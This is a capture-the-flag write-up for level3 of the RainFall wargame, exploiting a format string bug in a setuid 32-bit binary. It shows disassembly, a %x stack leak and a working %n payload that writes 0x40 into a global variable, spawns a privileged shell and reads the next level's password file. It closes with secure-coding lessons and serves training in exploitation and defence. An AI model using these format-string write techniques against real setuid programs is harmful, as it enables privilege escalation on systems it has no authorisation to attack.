# LEVEL03 - Format String 

> Vulnerability class: Format String
> Binary: ELF 32-bits, dynamically linked, not stripped
> Tools used: GDB, objdump, file

---

## Overview

The program passes user input directly to `printf()` without a format string specifier, giving an attacker full control over format string interpretation. By injecting `%n`, we write a controlled value into an uninitialized global variable, bypassing a comparison check and spawning a privileged shell.

---

## 1. Reconnaissance

```bash
   level3@RainFall:~$ file level3 
   level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
```

Key observations:

- setuid/setgid binary: successful exploitation escalates privileges
- not stripped: function names are preserved, simplifying static analysis
- dynamically linked: library functions resolved at runtime via PLT/GOT

---

## 2. Static Analysis 

### 2.1 Identifying the target

Disassembling `v()` reveals a comparison against a global variable before spawning a shell:
```
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   [...]
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
```

`objdump -D` confirms `m` is an uninitialized global in the `.bss` section:
```asm
0804988c <m>:
   804988c:       00 00                   add    %al,(%eax)
```

Goal: write the value `0x40` (64) into `m` at `0x0804988c` to bypass the jump and reach `system()`.

---

### 2.2 Identifying the vulnerability

Disassembling `v()` shows `printf()` receives user input directly as its first argument:
```asm
   0x080484c7 <+35>: call  0x80483a0 <fgets@plt>     ; reads input into buffer
   0x080484cc <+40>: lea   -0x208(%ebp), %eax        ; loads buffer address
   0x080484d2 <+46>: mov   %eax, (%esp)              ; passes buffer as first argument
   0x080484d5 <+49>: call  0x8048390 <printf@plt>    ; printf(buffer) — no format specifier
```

The correct usage would be `printf("%s", buffer)`. Without the `%s` specifier, user input is interpreted as the format string itself.

---

## 3. Dynamic Analysis

Running the binary confirms the format string vulnerability:
```bash
   level3@RainFall:~$ ./level3 
   %x.%x.%X.%X.%X.                        
   200.b7fd1ac0.B7FF37D0.252E7825.58252E78.
```

`printf()` interprets our input as a format string and leaks stack values. The program is exploitable.

---


## 4. Vulnerability

Root cause: `printf(buffer)` passes user-controlled input as the format string. An attacker can inject format specifiers to read from (`%x`) or write to (`%n`) arbitrary memory addresses.

`%n` behaviour: `%n` writes the number of characters printed so far by `printf()` into the address provided as the corresponding argument. By placing a target address in the input buffer and referencing it with `%n`, we can write a controlled integer value to any writable memory location.

Impact: Arbitrary write primitive → control of any global variable → privilege escalation.


---

## 5. Exploitation


### 5.1 Offset calculation using `%x`

We identify which `%x` parameter corresponds to our input buffer by using `AAAA` (`0x41414141`) as a marker:
```bash
    level3@RainFall:~$ ./level3 
    AAAA%x.%x.%x.%x.%x.%x.%x
    AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78.2e78252e
```
`0x41414141` appears at position **4**. Our input buffer is the 4th argument on the stack relative to `printf()`.


### 5.2 Payload construction

We need `printf()` to have printed exactly 64 characters when `%n` fires, since `0x40 = 64`.

```txt
   [ 4 bytes: address of m ] + [ %60c ] + [ %4$n ]
```

- `\x8c\x98\x04\x08` — address of `m` in little-endian (4 bytes, counted by `printf`)
- `%60c` — prints 60 additional characters, bringing the total to `4 + 60 = 64`
- `%4$n` — writes 64 into the address at the 4th argument (our buffer start = address of `m`)

### 5.3 Execution

```bash
   level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
   �                                                           
   Wait what?!
   whoami
   level4
   cat .pass
   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

---

## 6. Key Takeaways

| Concept | Detail |
|---|---|
| `printf(buffer)` is unsafe | Always use `printf("%s", buffer)` — never pass user input as the format string |
| `%x` for stack recon | Leaks stack values sequentially — used to locate input buffer offset |
| `%n` for arbitrary write | Writes character count to a pointer argument — powerful write primitive |
| `.bss` as write target | Uninitialized globals are writable and at predictable addresses |
| Character count precision | `%n` value = address bytes + padding characters — must equal target value exactly |